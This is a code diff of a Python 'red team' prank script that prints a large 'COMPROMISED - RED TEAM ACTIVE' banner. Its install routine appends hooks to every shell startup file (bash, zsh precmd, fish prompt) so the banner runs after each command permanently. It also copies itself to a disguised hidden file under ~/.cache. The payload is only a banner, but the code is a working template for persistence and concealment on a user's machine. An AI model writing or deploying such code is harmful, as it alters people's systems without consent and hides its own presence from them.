@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-# redteam_instant.py - RED TEAM banner after EVERY command — instantly
-
+# rt_banner.py - Prints red-team banner after EVERY command (zero delay)
 import os
 import sys
 
@@ -8,56 +7,68 @@ SCRIPT = os.path.abspath(__file__)
 
 BANNER = r"""
 \033[91m
-PLACEHOLDER
+╔═══════════════════════════════════════════════════════════╗
+║                                                           ║
+║     ██████╗ ███████╗ ███████╗██████╗ ████████╗███████╗    ║
+║     ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝    ║
+║     █████╗  ██║   ██║█████╗  ██║  ██║   ██║   █████╗      ║
+║     ██╔══╝  ██║   ██║██╔══╝  ██║  ██║   ██║   ██╔══╝      ║
+║     ██║     ╚██████╔╝██║     ██████╔╝   ██║   ███████╗    ║
+║     ╚═╝      ╚═════╝ ╚═╝     ╚═════╝    ╚═╝   ╚══════╝    ║
+║                                                           ║
+║             > COMPROMISED - RED TEAM ACTIVE <             ║
+╚═══════════════════════════════════════════════════════════╝
 \033[0m
 """
 
-def show():
+def print_banner():
     print(BANNER)
 
 def install():
-    hook = f'python3 "{SCRIPT}" show 2>/dev/null || true\n'
+    hook = f'python3 "{SCRIPT}" 2>/dev/null || true\n'
 
     configs = [
-        "~/.bashrc",
-        "~/.bash_profile",
-        "~/.zshrc",
-        "~/.zprofile",
-        "~/.profile",
-        "~/.config/fish/config.fish"
+        ("~/.bashrc",       hook),
+        ("~/.bash_profile", hook),
+        ("~/.zshrc",        hook + "precmd() { " + hook + "}\n"),  # zsh needs precmd
+        ("~/.zprofile",     hook),
+        ("~/.profile",      hook),
+        ("~/.config/fish/config.fish",
+         f'\nfunction fish_prompt\n    {hook}    command fish_prompt\nend\n')
     ]
 
-    for cfg in configs:
-        path = os.path.expanduser(cfg)
-        try:
-            if "fish" in path:
-                if not os.path.exists(os.path.dirname(path)):
-                    os.makedirs(os.path.dirname(path), exist_ok=True)
-                with open(path, "a") as f:
-                    f.write(f'\nfunction fish_prompt\n    {hook}    command fish_prompt\nend\n')
-            else:
-                if os.path.exists(path) or "bashrc" in path or "profile" in path:
-                    with open(path, "a") as f:
-                        f.write(f'\n{hook}')
-            print(f"[+] Installed in {cfg}")
-            break
-        except:
-            continue
-    else:
-        print("[-] No shell config found")
+    installed = False
+    for cfg_path, content in configs:
+        path = os.path.expanduser(cfg_path)
+        dir_path = os.path.dirname(path)
 
-    # Hide the script
-    hidden = os.path.expanduser("~/.cache/.sysfont")
-    os.system(f"cp '{SCRIPT}' '{hidden}' && chmod +x '{hidden}' 2>/dev/null")
+        if not os.path.exists(dir_path):
+            try:
+                os.makedirs(dir_path, exist_ok=True)
+            except:
+                continue
+
+        try:
+            with open(path, "a") as f:
+                f.write(content)
+            installed = True
+            print(f"[+] Injected into {cfg_path}")
+        except Exception as e:
+            continue
+
+    if not installed:
+        print("[-] Could not auto-install. Manual setup required.")
+        return
+
+    # Optional: hide a persistent copy
+    hidden = os.path.expanduser("~/.cache/.sysd")
+    os.makedirs(os.path.dirname(hidden), exist_ok=True)
+    os.system(f"cp '{SCRIPT}' '{hidden}' 2>/dev/null && chmod +x '{hidden}'")
+
+    print("[+] Red team banner will now appear after EVERY command — forever")
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        if sys.argv[1] == "--setup":
-            install()
-            print("[+] RED TEAM now appears after EVERY command — instantly and forever")
-            sys.exit(0)
-        elif sys.argv[1] == "show":
-            show()
-            sys.exit(0)
+    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
+        install()
     else:
-        show()
+        print_banner()
